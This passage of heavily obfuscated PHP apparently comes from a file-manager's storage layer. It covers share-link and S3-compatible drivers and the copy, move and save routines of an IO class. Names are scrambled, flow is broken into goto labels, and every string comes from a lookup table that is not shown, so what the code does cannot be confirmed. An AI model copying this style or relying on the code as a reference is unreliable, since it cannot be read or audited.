substr(md5($this->token . $AÛ…Ø•äÔ„[281] . $eõ‹ó‹‚Ø“ . $AÛ…Ø•äÔ„[1365] . $c„îÒĞ£Å), 12, 8) . $eõ‹ó‹‚Ø“; $AóÀì„¤ ¶[] = $AÛ…Ø•äÔ„[1366] . $B”Èó¹‘©; } $EŞ¡œ²éÄ = !empty($AóÀì„¤ ¶) ? $AÛ…Ø•äÔ„[70] . implode($AÛ…Ø•äÔ„[281], $AóÀì„¤ ¶) : $AÛ…Ø•äÔ„[33]; return $this->getHost() . $AÛ…Ø•äÔ„[8] . $c„îÒĞ£Å . $EŞ¡œ²éÄ; } public function fileOut($dõÉ…‹¶Ë, $dÙ°êºÂ¾‹ = false, $eÃÎÕ…Ì© = false, $aƒŠ˜£¯òˆ = '') { if ($this->isFileOutServer()) { return $this->fileOutServer($dõÉ…‹¶Ë, $dÙ°êºÂ¾‹, $eÃÎÕ…Ì©, $aƒŠ˜£¯òˆ); } if (!$eÃÎÕ…Ì©) { $eÃÎÕ…Ì© = $this->pathThis($dõÉ…‹¶Ë); } $D¸¸‚´ù = $dÙ°êºÂ¾‹ ? array($_SERVER[Ç³Íß¦Ó][1367] . rawurlencode($eÃÎÕ…Ì©)) : array(); $D¦ò·Š›ù = $this->link($dõÉ…‹¶Ë, $D¸¸‚´ù); $this->fileOutLink($D¦ò·Š›ù); } public function fileOutServer($C°•›¾áš‰, $C¦…ë–ñ›Ü = false, $a¢ÁÄÅ§…µ = false, $bÜ¶†Éß•Ò = '') { parent::fileOut($C°•›¾áš‰, $C¦…ë–ñ›Ü, $a¢ÁÄÅ§…µ, $bÜ¶†Éß•Ò); } public function fileOutImage($Dê‹éÜàôŠ, $Cè—ã‰’Š = 250) { $fÂ¾ğÆİ±ˆ = $this->link($Dê‹éÜàôŠ . $_SERVER[Ç³Íß¦Ó][1368] . $Cè—ã‰’Š); $this->fileOutLink($fÂ¾ğÆİ±ˆ); } public function fileOutImageServer($F‡±Åß¯, $F¨¯„®¹é = 250) { parent::fileOutImage($F‡±Åß¯, $F¨¯„®¹é); } public function hashMd5($F¾ˆÙèÌßô) { $d·àÆîÔ¥¥ =& $_SERVER[Ç³Íß¦Ó]; $B„»‘ÇĞ‡Í = $this->_objectMeta($F¾ˆÙèÌßô); return isset($B„»‘ÇĞ‡Í[$d·àÆîÔ¥¥[207]]) ? $B„»‘ÇĞ‡Í[$d·àÆîÔ¥¥[207]] : !1; } public function size($e‰¹§÷ëîï) { $Aá¸ĞµÑ‘ = $this->objectMeta($e‰¹§÷ëîï); return $Aá¸ĞµÑ‘ ? $Aá¸ĞµÑ‘[$_SERVER[Ç³Íß¦Ó][78]] : 0; } public function info($E¬¹‹¶Ì“æ) { if ($this->isFolder($E¬¹‹¶Ì“æ)) { return $this->folderInfo($E¬¹‹¶Ì“æ); } else { if ($this->isFile($E¬¹‹¶Ì“æ)) { return $this->fileInfo($E¬¹‹¶Ì“æ); } } return !1; } public function exist($F÷ÉÒš™õ) { return $this->isFile($F÷ÉÒš™õ) || $this->isFolder($F÷ÉÒš™õ); } public function isFile($CÚ‰áµ·Á‰) { return !$this->isFolder($CÚ‰áµ·Á‰) && $this->objectMeta($CÚ‰áµ·Á‰); } public function isFolder($dĞÈÃ‹šèÜ) { return $this->cacheMethod($_SERVER[Ç³Íß¦Ó][198], $dĞÈÃ‹šèÜ); } protected function objectMeta($B…ğïªˆÜæ) { return $this->cacheMethod($_SERVER[Ç³Íß¦Ó][199], $B…ğïªˆÜæ); } protected function _objectMeta($BŞªôŠ‚ª­) { goto fïïøƒØĞ; c¡ç™´…ë: $c¨­×õ»Ø = array($Aç·‡ìŠ[29] => isset($c±¬ß¾©‹‘[$Aç·‡ìŠ[1370]]) ? $c±¬ß¾©‹‘[$Aç·‡ìŠ[1370]] : null, $Aç·‡ìŠ[78] => isset($c±¬ß¾©‹‘[$Aç·‡ìŠ[1371]]) ? $c±¬ß¾©‹‘[$Aç·‡ìŠ[1371]] : null, $Aç·‡ìŠ[207] => isset($c±¬ß¾©‹‘[$Aç·‡ìŠ[1372]]) ? $c±¬ß¾©‹‘[$Aç·‡ìŠ[1372]] : null, $Aç·‡ìŠ[1339] => isset($c±¬ß¾©‹‘[$Aç·‡ìŠ[1373]]) ? $c±¬ß¾©‹‘[$Aç·‡ìŠ[1373]] : null); $c¨­×õ»Ø[$Aç·‡ìŠ[1340]] = isset($c±¬ß¾©‹‘[$Aç·‡ìŠ[1374]]) ? strtotime($c±¬ß¾©‹‘[$Aç·‡ìŠ[1374]]) : $c¨­×õ»Ø[$Aç·‡ìŠ[1339]]; return $c¨­×õ»Ø; goto Bƒ†Í®’¢á; fïïøƒØĞ: $Aç·‡ìŠ =& $_SERVER[Ç³Íß¦Ó]; if ($BŞªôŠ‚ª­ == $Aç·‡ìŠ[33] || $BŞªôŠ‚ª­ == $Aç·‡ìŠ[8]) { return array(); } $A‚Å·›—ö = $this->ussRequest($BŞªôŠ‚ª­, $Aç·‡ìŠ[1369]); goto f˜Ë†¤œ; f˜Ë†¤œ: if (!$A‚Å·›—ö[$Aç·‡ìŠ[1086]]) { return null; } $c±¬ß¾©‹‘ = isset($A‚Å·›—ö[$Aç·‡ìŠ[1088]]) ? $A‚Å·›—ö[$Aç·‡ìŠ[1088]] : array(); if (!isset($c±¬ß¾©‹‘[$Aç·‡ìŠ[1370]])) { return null; } goto c¡ç™´…ë; Bƒ†Í®’¢á: } protected function _isFolder($B™“Ë´Õ««) { $D×¤¦Íª§ò =& $_SERVER[Ç³Íß¦Ó]; if ($B™“Ë´Õ«« == $D×¤¦Íª§ò[33] || $B™“Ë´Õ«« == $D×¤¦Íª§ò[8]) { return !0; } $eµ¦óÕé¨Â = $this->_objectMeta($B™“Ë´Õ««); return isset($eµ¦óÕé¨Â[$D×¤¦Íª§ò[29]]) && $eµ¦óÕé¨Â[$D×¤¦Íª§ò[29]] == $D×¤¦Íª§ò[77] ? !0 : !1; } } goto F¯Ö–ˆŒŠ§; Bš™…šÕéÅ: class PathDriverDriverShareLink extends PathDriverDriverShareItem { public function __construct($C’Ïéƒ£‚˜) { $this->pathParse = $C’Ïéƒ£‚˜; } protected function infoParse($BŞ×åğÚ‡Â, $C¢ˆÃÎñ»Ğ = false) { $bø¾—˜è›› =& $_SERVER[Ç³Íß¦Ó]; return Action($bø¾—˜è››[1070])->sharePathInfo($this->pathParse[$bø¾—˜è››[76]], !0, $C¢ˆÃÎñ»Ğ); } public function listPath($f¶Â¢‚š, $bîõ¨òãÌ¬ = false) { $e‚†í¨•ÒÁ =& $_SERVER[Ç³Íß¦Ó]; $eÒŠöİÈ„Ô = IO::listPath($f¶Â¢‚š, $bîõ¨òãÌ¬); foreach ($eÒŠöİÈ„Ô as $CõˆŠ•»È‚ => $f‚¤ÎÚ¡•) { if (!in_array($CõˆŠ•»È‚, array($e‚†í¨•ÒÁ[74], $e‚†í¨•ÒÁ[75]))) { continue; } foreach ($f‚¤ÎÚ¡• as $F¯Ü¾Ô¡¯ => $EÜ™„¢©) { $EÜ™„¢© = Action($e‚†í¨•ÒÁ[1221])->parsePathChildren($EÜ™„¢©, array($e‚†í¨•ÒÁ[412] => $f¶Â¢‚š)); $eÒŠöİÈ„Ô[$CõˆŠ•»È‚][$F¯Ü¾Ô¡¯] = Action($e‚†í¨•ÒÁ[1070])->shareItemInfo($EÜ™„¢©); } } return $eÒŠöİÈ„Ô; } public function listAll($c÷Æ“ÃéºÛ) { $B¹È¨ö¨Ôù =& $_SERVER[Ç³Íß¦Ó]; $EêØ¥ÚˆâÎ = IO::listAll($c÷Æ“ÃéºÛ); foreach ($EêØ¥ÚˆâÎ as &$dÄÊæìÍ¹ã) { $cÃêô–÷ = IO::info($dÄÊæìÍ¹ã[$B¹È¨ö¨Ôù[76]]); $cÃêô–÷ = is_array($cÃêô–÷) ? $cÃêô–÷ : array(); $dÄÊæìÍ¹ã = array_merge($cÃêô–÷, $dÄÊæìÍ¹ã); $dÄÊæìÍ¹ã[$B¹È¨ö¨Ôù[85]] = Action($B¹È¨ö¨Ôù[1070])->shareItemInfo($dÄÊæìÍ¹ã); } unset($dÄÊæìÍ¹ã); return $EêØ¥ÚˆâÎ; } } class PathDriverEDS extends PathDriverMinIO { public function __construct($bİÛÈ‚‚Åô) { parent::__construct($bİÛÈ‚‚Åô); } } class PathDriverEOS extends PathDriverBaseS3 { public function __construct($céÄ¹ÍŞ¤Â) { parent::__construct($céÄ¹ÍŞ¤Â); $this->signatureVersion($_SERVER[Ç³Íß¦Ó][211]); } public function uploadFormData($dƒÛ£ŞÓ, $a½„…±¸¦ë = 3600) { goto e¼Â¶ÈÎÌ‡; e¼Â¶ÈÎÌ‡: $a’à”±Ï¯á =& $_SERVER[Ç³Íß¦Ó]; $C¿š‡Àèİï = $a’à”±Ï¯á[191]; $fïãí¾¤ØÂ = $a’à”±Ï¯á[1222]; goto fÎßø•´À‚; fÎßø•´À‚: $CØêè­–¢ = $a’à”±Ï¯á[59]; $aù¤¹´¢Ñ = gmdate($a’à”±Ï¯á[1223]); $C¯ÜÜ°Œ¬Û = gmdate($a’à”±Ï¯á[715]); goto d×´ïÅ»æ; aÖ–”êÈ…·: $c°Ø‹»§Œ = base64_encode(json_encode($d‡¬¶Ü•…³)); $CÙËÔô‘Ô = hash_hmac($a’à”±Ï¯á[1232], $C¯ÜÜ°Œ¬Û, $a’à”±Ï¯á[1233] . $this->secret, !0); $dÒâ½ò İ = hash_hmac($a’à”±Ï¯á[1232], $this->region, $CÙËÔô‘Ô, !0); goto cñµ¿è»Íí; cñµ¿è»Íí: $C¾°é‡‡á‰ = hash_hmac($a’à”±Ï¯á[1232], $CØêè­–¢, $dÒâ½ò İ, !0); $A©–İÎİŠÃ = hash_hmac($a’à”±Ï¯á[1232], $cêéÌ““°Š, $C¾°é‡‡á‰, !0); $D¯ë¼®¸‚ô = hash_hmac($a’à”±Ï¯á[1232], $c°Ø‹»§Œ, $A©–İÎİŠÃ); goto f Ú¾ƒî—Ù; d×´ïÅ»æ: $cêéÌ““°Š = $a’à”±Ï¯á[1224]; $d¦–Ò’‡‹ = $a½„…±¸¦ë . $a’à”±Ï¯á[33]; $bñ×„ã÷ç = $a’à”±Ï¯á[1187]; goto EŠå§Š„í¶; EŠå§Š„í¶: $BĞÒ¼¹…¥Ë = array($this->accessKey, $C¯ÜÜ°Œ¬Û, $this->region, $CØêè­–¢, $cêéÌ““°Š); $bæ³•ãÅÚ = implode($a’à”±Ï¯á[8], $BĞÒ¼¹…¥Ë); $d‡¬¶Ü•…³ = array($a’à”±Ï¯á[1189] => gmdate($a’à”±Ï¯á[1188], strtotime($a’à”±Ï¯á[1225])), $a’à”±Ï¯á[1190] => array(array($a’à”±Ï¯á[1192] => $this->bucket), array($a’à”±Ï¯á[1191] => $C¿š‡Àèİï), array($a’à”±Ï¯á[1193], $a’à”±Ï¯á[1194], $a’à”±Ï¯á[33]), array($a’à”±Ï¯á[1193], $a’à”±Ï¯á[1226], $a’à”±Ï¯á[33]), array($a’à”±Ï¯á[1193], $a’à”±Ï¯á[1227], $a’à”±Ï¯á[33]), array($a’à”±Ï¯á[1195] => $bñ×„ã÷ç), array($a’à”±Ï¯á[1228] => $bæ³•ãÅÚ), array($a’à”±Ï¯á[1229] => $fïãí¾¤ØÂ), array($a’à”±Ï¯á[1230] => $aù¤¹´¢Ñ), array($a’à”±Ï¯á[1231] => $d¦–Ò’‡‹))); goto aÖ–”êÈ…·; f Ú¾ƒî—Ù: $FÂˆïƒÅÏÙ = array($a’à”±Ï¯á[210] => $a’à”±Ï¯á[33], $a’à”±Ï¯á[1234] => $a’à”±Ï¯á[33], $a’à”±Ï¯á[1191] => $C¿š‡Àèİï, $a’à”±Ï¯á[1195] => $bñ×„ã÷ç, $a’à”±Ï¯á[1199] => $c°Ø‹»§Œ, $a’à”±Ï¯á[1235] => $bæ³•ãÅÚ, $a’à”±Ï¯á[1236] => $fïãí¾¤ØÂ, $a’à”±Ï¯á[1237] => $aù¤¹´¢Ñ, $a’à”±Ï¯á[1238] => $d¦–Ò’‡‹, $a’à”±Ï¯á[1239] => $D¯ë¼®¸‚ô, $a’à”±Ï¯á[175] => $this->getHost()); return $FÂˆïƒÅÏÙ; goto a…•–öà‰À; a…•–öà‰À: } } goto eßÚŠä¬×›; B£ˆÜö: class IO extends ClassBaseCall { public static $driverCache = array(); public static $driverListSystem = array(); public static $driverListUser = array(); public static function __callStatic($cµ¼ˆ–¬Ó‡, $B¼‹àŒø†) { goto BÏîÊ¢ŞŞ; BÏîÊ¢ŞŞ: $F¬ÑµÅ”à¢ =& $_SERVER[Ç³Íß¦Ó]; $cõ»ô¾¶¾ = $B¼‹àŒø†; $GLOBALS[$F¬ÑµÅ”à¢[1043]] = $F¬ÑµÅ”à¢[1044] . $cµ¼ˆ–¬Ó‡; goto eÕ¬µŒî£—; eÕ¬µŒî£—: Hook::trigger($F¬ÑµÅ”à¢[1044] . $cµ¼ˆ–¬Ó‡ . $F¬ÑµÅ”à¢[1045], $cõ»ô¾¶¾); $b‡µŠÁÈ×’ = self::driverMake($B¼‹àŒø†[0]); if (method_exists($b‡µŠÁÈ×’, $cµ¼ˆ–¬Ó‡)) { $bÃ—¥çêØÓ = @call_user_func_array(array($b‡µŠÁÈ×’, $cµ¼ˆ–¬Ó‡), $B¼‹àŒø†); } else { if (method_exists($b‡µŠÁÈ×’, $F¬ÑµÅ”à¢[1046])) { $bÃ—¥çêØÓ = @call_user_func_array(array($b‡µŠÁÈ×’, $cµ¼ˆ–¬Ó‡), $B¼‹àŒø†); } else { if (method_exists(self, $cµ¼ˆ–¬Ó‡)) { $bÃ—¥çêØÓ = @call_user_func_array(array(self, $cµ¼ˆ–¬Ó‡), $B¼‹àŒø†); } else { $bÃ—¥çêØÓ = call_user_func_array(array(parent, $cµ¼ˆ–¬Ó‡), $B¼‹àŒø†); } } } goto E³÷½†í‚; E³÷½†í‚: Hook::trigger($F¬ÑµÅ”à¢[1044] . $cµ¼ˆ–¬Ó‡ . $F¬ÑµÅ”à¢[1047], $cõ»ô¾¶¾, $bÃ—¥çêØÓ); return $bÃ—¥çêØÓ; goto EªÛ‚ŒÎ‡Ø; EªÛ‚ŒÎ‡Ø: } public static function init($b ˆœ‚—³Ó) { return self::driverMake($b ˆœ‚—³Ó); } public static function copy($d«ñÒì¾Â, $e°¸ìœŠáº, $C°ˆÃ‹³¢ = false, $DÆÚóÍ¨’» = false) { return self::copyMoveStart($d«ñÒì¾Â, $e°¸ìœŠáº, $C°ˆÃ‹³¢, $_SERVER[Ç³Íß¦Ó][517], $DÆÚóÍ¨’»); } public static function move($dª…‰ô™Ë¿, $a¾²Šå¥°ö, $f±¿ÈØ¥ŸÕ = false, $CÓöã”°½½ = false) { return self::copyMoveStart($dª…‰ô™Ë¿, $a¾²Šå¥°ö, $f±¿ÈØ¥ŸÕ, $_SERVER[Ç³Íß¦Ó][519], $CÓöã”°½½); } private static function copyMoveStart($fÛÉ±°·˜, $BÏãë„šÙƒ, $E î·§ƒŞ, $eİ¯ŒŒ‹›Ë, $FËÂŠÃŠ‘¿) { $fôíõàÎã¯ =& $_SERVER[Ç³Íß¦Ó]; $FâŠ›ƒó = array($fÛÉ±°·˜, $BÏãë„šÙƒ, $E î·§ƒŞ, $FËÂŠÃŠ‘¿); Hook::trigger($fôíõàÎã¯[1044] . $eİ¯ŒŒ‹›Ë . $fôíõàÎã¯[1045], $FâŠ›ƒó); $Cù£¹¶Ù…Æ = self::copyMove($fÛÉ±°·˜, $BÏãë„šÙƒ, $E î·§ƒŞ, $eİ¯ŒŒ‹›Ë, $FËÂŠÃŠ‘¿); Hook::trigger($fôíõàÎã¯[1044] . $eİ¯ŒŒ‹›Ë . $fôíõàÎã¯[1047], $FâŠ›ƒó, $Cù£¹¶Ù…Æ); return $Cù£¹¶Ù…Æ; } public static function saveFile($e›Ÿ”‚É, $A“£å‡Ùƒ, $b¼‘§çÀ•· = true) { goto Fñ²·Òñ×; cêîÁ‰ƒµ: $B“”© Óõ¹ = self::driverMake($A“£å‡Ùƒ); $dÂ’®îË‘ß = !1; if ($B“”© Óõ¹->pathParse[$EØˆ¿Éš‡ñ[1048]]) { $D¡áßÁãÌØ = $B“”© Óõ¹->pathParse[$EØˆ¿Éš‡ñ[1048]]; $dÂ’®îË‘ß = $B“”© Óõ¹; $B“”© Óõ¹ = self::driverMake($D¡áßÁãÌØ); } goto D±Í¹¸„é; D±Í¹¸„é: $B¿¶äÒ¬Àæ = $B“”© Óõ¹->pathFather($A“£å‡Ùƒ); $e©¨äùàĞ = !0; if (!$b¼‘§çÀ•· && self::driverIsSame($fçíÛ³Œ¨ï, $B“”© Óõ¹)) { $e©¨äùàĞ = !1; } goto FùÎ×†’¿º; Fñ²·Òñ×: $EØˆ¿Éš‡ñ =& $_SERVER[Ç³Íß¦Ó]; $EŠÅ‘²¨æ = self::info($A“£å‡Ùƒ); $fçíÛ³Œ¨ï = self::driverMake($e›Ÿ”‚É); goto cêîÁ‰ƒµ; FùÎ×†’¿º: $A×µ™¢Çƒ¦ = self::copyFile($fçíÛ³Œ¨ï, $e›Ÿ”‚É, $B“”© Óõ¹, $B¿¶äÒ¬Àæ, $EŠÅ‘²¨æ[$EØˆ¿Éš‡ñ[28]], $e©¨äùàĞ); if ($dÂ’®îË‘ß) { $A×µ™¢Çƒ¦ = $dÂ’®îË‘ß->getPathOuter($A×µ™¢Çƒ¦); } return $A×µ™¢Çƒ¦; goto Bİ®‰ËŠ««; Bİ®‰ËŠ««: } private static function copyMove($f÷»Í¨ß¨Î, $FÎÛ‡ÄÆƒ, $fƒÖÔé¢»º, $DºêÍ†ËÜê, $DÃ¥­ºÑ˜„ = false) { goto eÂÒŒŞª¹¶; C‡‡ôÑµ§¿: if ($dœˆ‘ß¢×‚) { $B˜ŸÕ¹—éØ = $dœˆ‘ß¢×‚->getPathOuter($B˜ŸÕ¹—éØ); } return $B˜ŸÕ¹—éØ; goto AÈŸ¢áÉå; eÖ‰æÔ±Üõ: $dœˆ‘ß¢×‚ = !1; if ($BØ´™¨ø£¬->pathParse[$cŠõ™ˆ¬›µ[1048]]) { $FÎÛ‡ÄÆƒ = $BØ´™¨ø£¬->pathParse[$cŠõ™ˆ¬›µ[1048]]; $dœˆ‘ß¢×‚ = $BØ´™¨ø£¬; $BØ´™¨ø£¬ = self::driverMake($FÎÛ‡ÄÆƒ); } self::check($e¢İó”é¹¹, $f÷»Í¨ß¨Î, $BØ´™¨ø£¬, $FÎÛ‡ÄÆƒ); goto D‹á½´²–; D‹á½´²–: Hook::trigger($cŠõ™ˆ¬›µ[73], $e¢İó”é¹¹, $f÷»Í¨ß¨Î, $BØ´™¨ø£¬, $FÎÛ‡ÄÆƒ); $c¿½„¼ÓÒ³ = self::driverIsSame($e¢İó”é¹¹, $BØ´™¨ø£¬); if ($c¿½„¼ÓÒ³) { if ($DºêÍ†ËÜê == $cŠõ™ˆ¬›µ[519] && !method_exists($BØ´™¨ø£¬, $cŠõ™ˆ¬›µ[1049]) && trim($FÎÛ‡ÄÆƒ, $cŠõ™ˆ¬›µ[8]) == trim($BØ´™¨ø£¬->pathFather($f÷»Í¨ß¨Î), $cŠõ™ˆ¬›µ[8])) { if ($e¢İó”é¹¹->pathThis($f÷»Í¨ß¨Î) != $DÃ¥­ºÑ˜„ && !$e¢İó”é¹¹->isTypeObject()) { return $e¢İó”é¹¹->rename($f÷»Í¨ß¨Î, $DÃ¥­ºÑ˜„); } return $BØ´™¨ø£¬->getPathOuter($f÷»Í¨ß¨Î); } if (method_exists($BØ´™¨ø£¬, $DºêÍ†ËÜê)) { return $BØ´™¨ø£¬->{$DºêÍ†ËÜê}($f÷»Í¨ß¨Î, $FÎÛ‡ÄÆƒ, $fƒÖÔé¢»º); } } goto dÄñÅÈ×ğ; a¼çÎÕÄ‡¥: $e¢İó”é¹¹ = self::driverMake($f÷»Í¨ß¨Î); $BØ´™¨ø£¬ = self::driverMake($FÎÛ‡ÄÆƒ); $B‚“Ü½Íİ„ = $DºêÍ†ËÜê == $cŠõ™ˆ¬›µ[519]; goto eÖ‰æÔ±Üõ; dÄñÅÈ×ğ: $bóèÂ‘‹ğŠ = $e¢İó”é¹¹->isFile($f÷»Í¨ß¨Î); if (!$bóèÂ‘‹ğŠ && $BØ´™¨ø£¬->getType() == $cŠõ™ˆ¬›µ[719] && $e¢İó”é¹¹->getType() == $cŠõ™ˆ¬›µ[106]) { $B˜ŸÕ¹—éØ = $BØ´™¨ø£¬->copyFolderFromIO($e¢İó”é¹¹, $f÷»Í¨ß¨Î, $FÎÛ‡ÄÆƒ, $fƒÖÔé¢»º, $B‚“Ü½Íİ„, $DÃ¥­ºÑ˜„); } else { $B˜ŸÕ¹—éØ = self::copyPath($e¢İó”é¹¹, $f÷»Í¨ß¨Î, $BØ´™¨ø£¬, $FÎÛ‡ÄÆƒ, $fƒÖÔé¢»º, $B‚“Ü½Íİ„, $bóèÂ‘‹ğŠ, $DÃ¥­ºÑ˜„); } if ($B˜ŸÕ¹—éØ && $B‚“Ü½Íİ„) { $e¢İó”é¹¹->remove($f÷»Í¨ß¨Î); } goto C‡‡ôÑµ§¿; eÂÒŒŞª¹¶: $cŠõ™ˆ¬›µ =& $_SERVER[Ç³Íß¦Ó]; if (!$f÷»Í¨ß¨Î || $f÷»Í¨ß¨Î == $cŠõ™ˆ¬›µ[8] || !$FÎÛ‡ÄÆƒ) { return !1; } ignore_timeout(); goto a¼çÎÕÄ‡¥; AÈŸ¢áÉå: } private static function check($FØƒ‹ Ö‹, $D®“ÓÂ¥É§, $bÈÑ¡­, &$eƒ„Ê«Ìí®) { $FÍˆËÒàç» =& $_SERVER[Ç³Íß¦Ó]; if (self::driverIsSame($FØƒ‹ Ö‹, $bÈÑ¡­) && $FØƒ‹ Ö‹->isFolder($D®“ÓÂ¥É§) && $FØƒ‹ Ö‹->isParentOf($D®“ÓÂ¥É§, $eƒ„Ê«Ìí®)) { show_json(LNG($FÍˆËÒàç»[1050]), !1); } if (!$FØƒ‹ Ö‹->exist($D®“ÓÂ¥É§)) { show_json(LNG($FÍˆËÒàç»[105]), !1); } } private static function copyPath($DÊè©®Åß“, $cÍ¶‚îÑÀ, $c¢¼—Íã†õ, $a¡¢œª›Ä, $BË‰ÁÕ÷Ì, $bÔ™Œ¦Ñ÷, $dÄ×´ÉÀïŞ, $dç¥è–Êµ = false) { goto c¹‰èÌÌ½; BÂ‡Èî öµ: $A†‡Á†ƒáµ = is_array($A†‡Á†ƒáµ) ? $A†‡Á†ƒáµ : array($FÑ‘è‹Õİæ[74] => array(), $FÑ‘è‹Õİæ[75] => array()); $F¿¬µ‚ŒÕÂ = array_merge($A†‡Á†ƒáµ[$FÑ‘è‹Õİæ[74]], $A†‡Á†ƒáµ[$FÑ‘è‹Õİæ[75]]); foreach ($F¿¬µ‚ŒÕÂ as $Cô‰õõÆ¡Ï) { $DŠˆˆó¼èÕ = $Cô‰õõÆ¡Ï[$FÑ‘è‹Õİæ[29]] == $FÑ‘è‹Õİæ[192]; $cÍ¶‚îÑÀ = $DÊè©®Åß“->getPathInner($Cô‰õõÆ¡Ï[$FÑ‘è‹Õİæ[76]]); $BÆŞåŸç¤¡ = self::copyPath($DÊè©®Åß“, $cÍ¶‚îÑÀ, $c¢¼—Íã†õ, $a¡¢œª›Ä, $BË‰ÁÕ÷Ì, $bÔ™Œ¦Ñ÷, $DŠˆˆó¼èÕ); if (!$BÆŞåŸç¤¡) { IO::errorTips($FÑ‘è‹Õİæ[1051] . $cÍ¶‚îÑÀ . $FÑ‘è‹Õİæ[67] . $a¡¢œª›Ä); } } goto aø¹²Šºâ; c¹‰èÌÌ½: $FÑ‘è‹Õİæ =& $_SERVER[Ç³Íß¦Ó]; $cäì·¯âÈ÷ = $dç¥è–Êµ ? $dç¥è–Êµ : $DÊè©®Åß“->pathThis($cÍ¶‚îÑÀ); if ($BË‰ÁÕ÷Ì) { $A•æÒÕ×ĞÓ = $c¢¼—Íã†õ->fileNameExist($a¡¢œª›Ä, $cäì·¯âÈ÷); $cäì·¯âÈ÷ = $c¢¼—Íã†õ->fileNameAuto($a¡¢œª›Ä, $cäì·¯âÈ÷, $BË‰ÁÕ÷Ì, !$dÄ×´ÉÀïŞ); $BË‰ÁÕ÷Ì = $A•æÒÕ×ĞÓ ? $BË‰ÁÕ÷Ì : !1; } goto cŸÁŒ»Ÿ; FâïèÓùˆ¨: $dºæê»çÉÌ = $c¢¼—Íã†õ->mkdir($c¢¼—Íã†õ->getPath($B®î‹„†•ß)); $a¡¢œª›Ä = $c¢¼—Íã†õ->getPathInner($dºæê»çÉÌ); $A†‡Á†ƒáµ = $DÊè©®Åß“->listPath($cÍ¶‚îÑÀ, !0); goto BÂ‡Èî öµ; aø¹²Šºâ: self::copyMoveKeepInfo($DÊè©®Åß“, $cÍ¶‚îÑÀ, $dºæê»çÉÌ); return $dºæê»çÉÌ; goto f‰¹¿İâ; cŸÁŒ»Ÿ: if ($dÄ×´ÉÀïŞ) { return self::copyFile($DÊè©®Åß“, $cÍ¶‚îÑÀ, $c¢¼—Íã†õ, $a¡¢œª›Ä, $cäì·¯âÈ÷, $bÔ™Œ¦Ñ÷); } if ($BË‰ÁÕ÷Ì == REPEAT_RENAME_FOLDER) { $BË‰ÁÕ÷Ì = !1; } $B®î‹„†•ß = rtrim($a¡¢œª›Ä, $FÑ‘è‹Õİæ[8]) . $FÑ‘è‹Õİæ[8] . $cäì·¯âÈ÷; goto FâïèÓùˆ¨; f‰¹¿İâ: } private static function copyFile($BÙ—Ò’¤¢‚, $aîÜ°ÈÃà, $aŒé†ÔĞ÷», $BŒ‘³Š£¼ù, $AÃ´­©½°Ì, $Eà£èš¢™£) { goto CÉ˜âñ¹; FÌ¡›ÌÏËŒ: mk_dir($C¨—šÌ‘œí); $dÒëŞ˜Ë = $C¨—šÌ‘œí . $fÖ«¹õ‡†Æ; $cÕ§×îöÏ = $dÒëŞ˜Ë; goto díœôµÜÅ; díœôµÜÅ: $dÒëŞ˜Ë = $BÙ—Ò’¤¢‚->download($aîÜ°ÈÃà, $dÒëŞ˜Ë); $dÒëŞ˜Ë = $BÙ—Ò’¤¢‚->iconvApp($dÒëŞ˜Ë); $eº”õ÷ğâÁ = $aŒé†ÔĞ÷»->upload($BŒ‘³Š£¼ù, $dÒëŞ˜Ë, $Eà£èš¢™£); goto cš‘°Ûì­š; Cìç¯ä„Ùæ: if ($GLOBALS[$FŸ²ÃŒëšÑ[6]][$FŸ²ÃŒëšÑ[88]][$FŸ²ÃŒëšÑ[761]]) { $FÁ÷ ³´¸Œ = $GLOBALS[$FŸ²ÃŒëšÑ[6]][$FŸ²ÃŒëšÑ[88]][$FŸ²ÃŒëšÑ[761]]; } $Eà£èš¢™£ = !0; $C¨—šÌ‘œí = $FÁ÷ ³´¸Œ; goto FÌ¡›ÌÏËŒ; cš‘°Ûì­š: self::remove($cÕ§×îöÏ); Hook::trigger($FŸ²ÃŒëšÑ[1054], $BÙ—Ò’¤¢‚, $aîÜ°ÈÃà, $aŒé†ÔĞ÷», $BŒ‘³Š£¼ù, $AÃ´­©½°Ì, $eº”õ÷ğâÁ); self::copyMoveKeepInfo($BÙ—Ò’¤¢‚, $aîÜ°ÈÃà, $eº”õ÷ğâÁ); goto DÄÃºŠ¸ùå; DÄÃºŠ¸ùå: return $eº”õ÷ğâÁ; goto FÊŞßô¬•Ï; CÉ˜âñ¹: $FŸ²ÃŒëšÑ =& $_SERVER[Ç³Íß¦Ó]; $BŒ‘³Š£¼ù = $aŒé†ÔĞ÷»->getPath(rtrim($BŒ‘³Š£¼ù, $FŸ²ÃŒëšÑ[8]) . $FŸ²ÃŒëšÑ[8] . $AÃ´­©½°Ì); $fÖ«¹õ‡†Æ = $FŸ²ÃŒëšÑ[1052] . time() . rand_string(5); goto aŸ‰œÓäõ; aŸ‰œÓäõ: Hook::trigger($FŸ²ÃŒëšÑ[1053], $BÙ—Ò’¤¢‚, $aîÜ°ÈÃà, $aŒé†ÔĞ÷», $BŒ‘³Š£¼ù, $AÃ´­©½°Ì, $fÖ«¹õ‡†Æ); if (self::driverIsSame($BÙ—Ò’¤¢‚, $aŒé†ÔĞ÷»)) { if ($Eà£èš¢™£) { $eº”õ÷ğâÁ = $aŒé†ÔĞ÷»->moveFile($aîÜ°ÈÃà, $BŒ‘³Š£¼ù); } else { $eº”õ÷ğâÁ = $aŒé†ÔĞ÷»->copyFile($aîÜ°ÈÃà, $BŒ‘³Š£¼ù); } Hook::trigger($FŸ²ÃŒëšÑ[1054], $BÙ—Ò’¤¢‚, $aîÜ°ÈÃà, $aŒé†ÔĞ÷», $BŒ‘³Š£¼ù, $AÃ´­©½°Ì, $eº”õ÷ğâÁ); self::copyMoveKeepInfo($BÙ—Ò’¤¢‚, $aîÜ°ÈÃà, $eº”õ÷ğâÁ); return $eº”õ÷ğâÁ; } $FÁ÷ ³´¸Œ = TEMP_FILES; goto Cìç¯ä„Ùæ; FÊŞßô¬•Ï: } private static function copyMoveKeepInfo($CËÑÊÔÑ, $eÀ—Æ÷…Ô, $fğÅÆğÛÄ) { if (!$fğÅÆğÛÄ) { return; } $D¨²¹â´¨— = $CËÑÊÔÑ->info($eÀ—Æ÷…Ô); if (!is_array($D¨²¹â´¨—)) { return; } IO::setModifyTime($fğÅÆğÛÄ, $D¨²¹â´¨—[$_SERVER[Ç³Íß¦Ó][84]]); } public static function pathFather($Bš“›Œ¡­) { $BÚîî¾¶‘Å = IO::init($Bš“›Œ¡­); $AÀí˜’å²… = $BÚîî¾¶‘Å->pathFather($BÚîî¾¶‘Å->path); return $BÚîî¾¶‘Å->getPathOuter($AÀí˜’å²…); } public static function 